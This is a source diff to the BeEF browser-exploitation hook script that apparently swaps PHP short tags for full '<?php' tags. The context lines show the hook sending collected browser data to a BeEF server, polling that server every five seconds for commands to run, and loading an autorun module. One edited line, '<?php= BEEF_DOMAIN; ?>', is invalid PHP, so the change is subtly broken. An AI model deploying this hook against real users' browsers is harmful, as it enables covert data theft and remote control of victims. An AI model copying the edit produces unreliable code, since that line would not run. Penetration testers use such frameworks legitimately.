@@ -1,4 +1,4 @@
-<?
+<?php
 	// Copyright (c) 2006-2009, Wade Alcorn 
 	// All Rights Reserved
 	// wade@bindshell.net - http://www.bindshell.net
@@ -23,7 +23,7 @@ if (window.attachEvent)
 else if (window.addEventListener) 
         window.addEventListener('load', beef_onload, 0);
 
-beef_url = "<?= BEEF_DOMAIN; ?>";
+beef_url = "<?php= BEEF_DOMAIN; ?>";
 
 // ---[ IS_XUL_CHROME
 // determing if we are in chrome (privileged browser zone)
@@ -111,7 +111,7 @@ return_result('screen', sw+ "x" +sh+ " with " +sd+ "-bit colour");
 // send result to beef
 function return_result(action, data) {
 	var img_tmp = new Image();
-	var src = beef_url + '/hook/return.php?BeEFSession=<? echo session_id(); ?>&action=' + action + '&data=' + escape(data);
+	var src = beef_url + '/hook/return.php?BeEFSession=<?php echo session_id(); ?>&action=' + action + '&data=' + escape(data);
 	img_tmp.src = src;
 }
 
@@ -146,7 +146,7 @@ function include(script_filename) {
 // start heartbeat
 setInterval(function () {
 	var date = new Date().getTime();
-	include(beef_url + '/hook/command.php?BeEFSession=<? echo session_id(); ?>&time=' + date);
+	include(beef_url + '/hook/command.php?BeEFSession=<?php echo session_id(); ?>&time=' + date);
 }, 5000);
 
 // run autorun module
@@ -154,6 +154,6 @@ setInterval(function () {
 // our injection may occur before the element is created within the DOM
 setTimeout(function () {
 	var date = new Date().getTime();
-	include(beef_url + '/hook/autorun.js.php?BeEFSession=<? echo session_id(); ?>&time=' + date);
+	include(beef_url + '/hook/autorun.js.php?BeEFSession=<?php echo session_id(); ?>&time=' + date);
 }, 2000);
 
